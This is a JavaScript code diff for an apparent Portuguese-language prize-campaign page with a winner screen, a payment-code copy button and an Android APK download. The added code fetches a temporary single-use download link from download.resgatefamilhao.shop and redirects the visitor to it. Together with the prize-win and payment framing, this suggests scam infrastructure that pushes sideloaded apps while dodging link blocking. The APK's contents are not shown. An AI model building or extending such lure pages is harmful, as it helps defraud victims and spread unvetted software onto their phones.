@@ -1,6 +1,7 @@
 const WORKER_BASE='https://download.resgatefamilhao.shop';
 const API_URL=WORKER_BASE+'/config';
 const APK_STATUS_URL=WORKER_BASE+'/apk/status';
+const APK_LINK_URL=WORKER_BASE+'/apk/link';
 const STORAGE_KEY='campanha-premiada-settings';
 
 const defaults={
@@ -134,6 +135,47 @@ function launchConfetti(){
 document.getElementById('ctaButton')?.addEventListener('click',showRedemption);
 document.getElementById('backButton')?.addEventListener('click',showWinner);
 document.getElementById('copyPaymentCode')?.addEventListener('click',copyCode);
+document.getElementById('apkDownloadButton')?.addEventListener('click',event=>{
+  event.preventDefault();
+  downloadApk();
+});
+
+async function requestTemporaryApkLink(){
+  const response=await fetch(APK_LINK_URL+'?t='+Date.now(),{
+    method:'POST',
+    cache:'no-store',
+    headers:{'Accept':'application/json'}
+  });
+
+  if(!response.ok){
+    const text=await response.text().catch(()=> '');
+    throw new Error('HTTP '+response.status+' '+text);
+  }
+
+  const data=await response.json();
+  if(!data.url) throw new Error('LINK_MISSING');
+  return data.url;
+}
+
+async function downloadApk(){
+  const button=document.getElementById('apkDownloadButton');
+  if(!button || button.classList.contains('is-disabled')) return;
+
+  const originalText=button.textContent;
+  button.setAttribute('aria-busy','true');
+  button.textContent='Gerando link seguro...';
+
+  try{
+    const url=await requestTemporaryApkLink();
+    window.location.assign(url);
+  }catch(error){
+    console.error('Falha ao gerar link temporário do APK:',error);
+    button.textContent='Não foi possível gerar o download';
+    setTimeout(()=>button.textContent=originalText,2200);
+  }finally{
+    button.removeAttribute('aria-busy');
+  }
+}
 
 async function updateApkDownload(){
   const button=document.getElementById('apkDownloadButton');
@@ -148,7 +190,7 @@ async function updateApkDownload(){
       button.classList.remove('is-disabled');
       button.removeAttribute('aria-disabled');
       button.textContent='Baixar aplicativo Familhão Resgate';
-      button.href=WORKER_BASE+'/apk';
+      button.href='#';
     }else{
       button.classList.add('is-disabled');
       button.setAttribute('aria-disabled','true');
